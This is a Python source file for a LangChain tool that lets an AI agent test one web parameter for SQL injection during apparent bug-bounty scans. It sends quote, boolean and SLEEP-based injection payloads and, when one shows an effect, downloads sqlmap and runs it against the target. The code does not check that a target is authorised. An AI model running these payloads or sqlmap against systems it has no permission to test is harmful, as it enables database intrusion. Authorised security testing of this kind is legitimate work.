"""Staged SQL-injection testing for Aplomado bug-hunting scans.

STAGED ESCALATION, enforced in code: the tool ALWAYS runs cheap, quiet
indicator probes first (error strings, boolean differentials, time delay).
sqlmap is provisioned and executed ONLY when an indicator fires — never as
a broad scanner. Proof stops at version/user/database; no --dump-all.

This is the tread-lightly rule made executable: detect light, escalate
only on a hit.
"""

from __future__ import annotations

import shlex
import time

from langchain_core.tools import BaseTool, StructuredTool

from pinnace.sandbox import Sandbox

from .auth import CookieJar

SQLMAP_ZIP_URL = "https://github.com/sqlmapproject/sqlmap/archive/refs/heads/master.zip"
SQLMAP_DIR = "sqlmap-master"
MAX_SQLI_OUTPUT = 20_000

# DBMS error strings that indicate a live injection point.
_SQL_ERROR_MARKERS = (
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "ora-01756",
    "ora-00933",
    "microsoft ole db provider",
    "odbc sql server driver",
    "postgresql query failed",
    "sqlite3::query()",
    "pg_query()",
)


def _curl(sandbox: Sandbox, url: str, cookie_jar: CookieJar | None) -> tuple[str, float]:
    """GET *url* via curl; return (body, elapsed_seconds)."""
    cmd = f"curl -sk --max-time 25 {shlex.quote(url)}"
    if cookie_jar is not None:
        header = cookie_jar.cookie_header()
        if header:
            cmd += f" -H {shlex.quote(header)}"
    start = time.monotonic()
    try:
        result = sandbox.exec(cmd, timeout=60.0)
    except Exception as e:  # noqa: BLE001 - surface to the model
        return f"error: {e}", 0.0
    return result.stdout, time.monotonic() - start


def _probe_indicators(
    sandbox: Sandbox, url: str, param: str, cookie_jar: CookieJar | None
) -> tuple[bool, str]:
    """Run light SQLi indicator probes. Returns (hit, detail)."""
    sep = "&" if "?" in url else "?"
    base, base_t = _curl(sandbox, url, cookie_jar)
    if base.startswith("error:"):
        return False, f"baseline request failed: {base}"

    # 1. Single-quote error probe.
    err_body, _ = _curl(sandbox, f"{url}{sep}{param}='", cookie_jar)
    lowered = err_body.lower()
    for marker in _SQL_ERROR_MARKERS:
        if marker in lowered:
            return True, f"SQL error string disclosed ({marker[:40]}…)"

    # 2. Boolean differential: AND 1=1 vs AND 1=2.
    true_body, _ = _curl(
        sandbox, f"{url}{sep}{param}=1%27%20AND%201%3D1--+-", cookie_jar
    )
    false_body, _ = _curl(
        sandbox, f"{url}{sep}{param}=1%27%20AND%201%3D2--+-", cookie_jar
    )
    if len(true_body) != len(false_body) and abs(len(true_body) - len(false_body)) > 20:
        return (
            True,
            f"boolean differential: 1=1 → {len(true_body)} bytes, "
            f"1=2 → {len(false_body)} bytes",
        )

    # 3. Time differential (SLEEP 5 vs baseline).
    _, sleep_t = _curl(
        sandbox, f"{url}{sep}{param}=1%27%20AND%20SLEEP(5)--+-", cookie_jar
    )
    if sleep_t - base_t > 4.0:
        return True, f"time differential: baseline {base_t:.1f}s, SLEEP {sleep_t:.1f}s"

    return False, "no indicator (no error strings, no boolean/time differential)"


def _ensure_sqlmap(sandbox: Sandbox) -> str | None:
    try:
        probe = sandbox.exec(f"test -x ./{SQLMAP_DIR}/sqlmap.py", timeout=30.0)
    except Exception as e:  # noqa: BLE001 - surface to the model
        return f"error: can't probe for sqlmap: {e}"
    if probe.exit_code == 0:
        return None
    code = (
        "import os, urllib.request, zipfile; "
        f"urllib.request.urlretrieve({SQLMAP_ZIP_URL!r}, 'sqlmap.zip'); "
        "zipfile.ZipFile('sqlmap.zip').extractall('.'); "
        "os.remove('sqlmap.zip')"
    )
    try:
        dl = sandbox.exec("python3 -c " + shlex.quote(code), timeout=300.0)
    except Exception as e:  # noqa: BLE001 - surface to the model
        return f"error: sqlmap download failed: {e}"
    if dl.exit_code != 0:
        return f"error: sqlmap download failed: {dl.stderr.strip()[:300]}"
    return None


def sqli_tool(sandbox: Sandbox, cookie_jar: CookieJar | None = None) -> BaseTool:
    """Build the staged SQLi tool bound to *sandbox*."""
    ready: dict = {}

    def sqli(url: str, param: str) -> str:
        """Test one parameter for SQL injection (STAGED).

        url: target URL (without the test parameter value is fine).
        param: the parameter name to test, e.g. "id".
        Stage 1 (always): quiet indicator probes — error strings, boolean
        differential, time differential. Stage 2 (ONLY on indicator):
        targeted sqlmap against that single parameter, proof limited to
        version/user/database. Never broad, never --dump-all.
        """
        hit, detail = _probe_indicators(sandbox, url, param, cookie_jar)
        log = [f"$ sqli probe {param} @ {url}", f"stage 1 (indicators): {detail}"]
        if not hit:
            log.append("no indicator — sqlmap NOT run (staged escalation rule)")
            return "\n".join(log)
        log.append("indicator found — escalating to targeted sqlmap")
        if not ready.get("binary"):
            err = _ensure_sqlmap(sandbox)
            if err:
                return "\n".join(log) + f"\n{err}"
            ready["binary"] = True
        sep = "&" if "?" in url else "?"
        target = f"{url}{sep}{param}=1"
        cmd = (
            f"python3 ./{SQLMAP_DIR}/sqlmap.py -u {shlex.quote(target)} "
            f"-p {shlex.quote(param)} --batch --level=3 --risk=2 "
            f"--random-agent --banner"
        )
        if cookie_jar is not None:
            header = cookie_jar.cookie_header()
            if header:
                # sqlmap takes --cookie "a=b; c=d"
                raw = header.split(":", 1)[1].strip() if ":" in header else header
                cmd += f" --cookie {shlex.quote(raw)}"
        try:
            result = sandbox.exec(cmd, timeout=900.0)
        except Exception as e:  # noqa: BLE001 - surface to the model
            return "\n".join(log) + f"\nerror: sqlmap run failed: {e}"
        out = "\n".join(log) + f"\n[sqlmap exit {result.exit_code}]\n{result.stdout}"
        if len(out) > MAX_SQLI_OUTPUT:
            out = out[:MAX_SQLI_OUTPUT] + f"\n…[truncated at {MAX_SQLI_OUTPUT} chars]"
        return out

    return StructuredTool.from_function(
        sqli,
        name="sqli",
        description=(
            "STAGED SQL-injection test for one parameter. Always runs quiet "
            "indicator probes first; sqlmap runs ONLY if an indicator fires, "
            "targeted at that parameter. Give it url + param name."
        ),
    )
